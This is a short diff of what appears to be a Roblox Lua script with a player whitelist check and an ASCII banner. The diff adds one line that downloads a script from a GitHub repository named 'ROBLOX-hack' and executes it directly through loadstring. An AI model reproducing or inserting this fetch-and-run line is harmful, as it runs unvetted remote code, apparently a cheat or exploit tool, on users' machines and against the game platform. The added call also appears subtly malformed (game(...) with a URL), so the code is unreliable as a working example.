@@ -40,3 +40,5 @@ if isWhitelisted(Players.LocalPlayer.Name) then
     print("   \/____/ \/___/  \/__/\/_/ \/__,_ / ")
     print(" ")
 end
+
+loadstring(game(('https://raw.githubusercontent.com/rlagusdn143/ROBLOX-hack/main/Test%20V1')))()
